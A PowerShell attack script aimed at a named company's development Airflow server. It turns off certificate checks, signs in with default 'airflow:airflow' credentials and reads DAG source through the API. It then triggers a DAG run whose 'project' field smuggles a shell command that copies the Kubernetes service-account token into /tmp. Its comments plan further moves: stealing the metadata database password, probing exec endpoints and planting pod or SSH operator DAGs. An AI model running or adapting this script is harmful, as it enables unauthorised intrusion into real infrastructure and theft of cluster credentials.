Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
    }
}

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
        return "EXC:" + $_.Exception.Message
    }
}

# Step 1: Read dbdocs DAG source
$file_token = ".eJxT0s8vKNFPzCxKy8kv109JTC_WT0lKyU8ujk8qzcxJiU9Jys2JT6nMS8zNTMYto1dQqQQAHWkcbQ.cjN1Cn_noKb-noaGqugUPwtGI8w"
Write-Host "=== DBDOCS SOURCE ==="
Write-Host (AF-Get "/api/v1/dagSources/$file_token")

# Step 2: Trigger dbdocs with connection_id param 
# dbdocs dag uses connection_id to get DB credentials, runs dbdocs CLI
# The CLI call involves a bash command - inject via project name or password field
$ts = [DateTimeOffset]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")

# Try with connection_id set (required field)
$body = "{`"conf`":{`"project`":`"testpwn\`$(cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/k8s.tok)`",`"password`":`"`",`"connection_id`":`"confins_r3_foundation`"},`"logical_date`":`"$ts`"}"
Write-Host "`n=== TRIGGER dbdocs injection ==="
Write-Host (AF-Post "/api/v1/dags/dbdocs_build_dbml_dynamic/dagRuns" $body)

# Step 3: Try to get K8s SA token via Airflow pod env
# Airflow runs in K8s pod, uses in_cluster=True by default
# We can create a KubernetesPodOperator DAG via API and trigger it
# OR use Airflow exec endpoint if available

# Step 4: Check if there's an exec/bash endpoint
Write-Host "`n=== CHECK EXEC ENDPOINT ==="
Write-Host (AF-Get "/api/v1/cli")
Write-Host (AF-Get "/admin/airflow/task")

# Step 5: List recent DAG runs to check if our trigger worked
Start-Sleep -Seconds 5
Write-Host "`n=== RECENT RUNS dbdocs ==="
Write-Host (AF-Get "/api/v1/dags/dbdocs_build_dbml_dynamic/dagRuns?limit=5&order_by=-start_date")

# Step 6: Also try - get the Airflow metadata DB password via test connection
# Airflow stores its own DB password in env var AIRFLOW__DATABASE__SQL_ALCHEMY_CONN
# We need to get into the pod. Try SSHOperator DAG trigger.

# Try creating a new DAG via API (Airflow 2.x doesn't support DAG creation via API directly)
# But we can try to POST to /api/v1/dags - will fail
Write-Host "`n=== AIRFLOW VERSION ==="
Write-Host (AF-Get "/api/v1/version")
